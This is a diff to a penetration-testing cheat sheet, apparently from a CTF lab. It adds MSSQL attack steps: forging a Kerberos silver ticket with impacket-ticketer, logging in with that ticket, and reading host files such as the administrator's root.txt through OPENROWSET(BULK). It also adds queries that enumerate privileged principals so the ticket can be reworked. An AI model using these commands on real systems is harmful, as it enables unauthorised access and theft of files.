@@ -98,6 +98,7 @@ SELECT m.name AS principal_name, m.type_desc, r.name AS server_role FROM sys.ser
 
 Navigate through files:
 master.sys.xp_dirtree 'c:\',1,1 -- change directory to see the files and folders.
+SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'ADMINISTER BULK OPERATIONS'); -- check if you have permisions to see file content
 SELECT * FROM OPENROWSET(BULK 'C:\archivo.txt', SINGLE_CLOB) a; -- see content of text file
 
 ```
@@ -152,7 +153,7 @@ SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)>
 
 ### SPN user -> Silver ticket
 
-If the user you compromise have an SPN associated you may create arbitrary kerberos tickets, for any user or group, for that specific service.
+If the user you compromise have an SPN associated you may create arbitrary kerberos tickets, for any user or group, for that specific service. In some ocasions, connecting to sqlserver with an user who have "sysadmin" role in the server may allow you to read sensible files in the host, usign "OPENROWSET(BULK" query.
 
 Users associated to SPN use to be called like:
 
@@ -179,7 +180,17 @@ If an user is associacted to an SPN you my craft arbitrary kerberos tickets (onl
 
 Kali -> `impacket-ticketer -nthash '<nt hash>' -domain-sid '<domain SID>' -domain '<domain>' -spn '<spn>' '<user or group to impersonate>'`
 
+`export KRB5CCNAME=<user you used>.ccache`
 
+`mssqlclient.py <machine>.<domain> -k -no-pass -windows-auth` (make sure `<machine>.<domain>` is registred in /etc/hosts)
+
+Kali -> `impacket-mssqlclient <machine>.<domain> -k -no-pass -windows-auth`
+
+As I wrote before, certain users (linked to SPN) could be able to read sensitive data without the xp_cmdshell module:
+
+`SELECT * FROM OPENROWSET(BULK 'c:/users/administrator/desktop/root.txt', SINGLE_CLOB) a;`
+
+Notes: Depending how you craft the ticket you may have more or less permisions. Check privileged users/groups with `SELECT m.name AS principal_name, m.type_desc, r.name AS server_role FROM sys.server_role_members rm JOIN sys.server_principals r ON rm.role_principal_id=r.principal_id JOIN sys.server_principals m ON rm.member_principal_id=m.principal_id WHERE m.type_desc IN ('WINDOWS_LOGIN','WINDOWS_GROUP') ORDER BY r.name;`, and get RID from that user or group with `SELECT SUSER_SID('<domain>\<user>') AS SID_Usuario;`. Convert hex to SID format with [hex2sid.py](https://github.com/ArtesOscuras/Tools/blob/main/hex2sid.py) (from tools section) to get domain and user/group RIDs, and recraft your ticket until you can reed files.
 
 
 
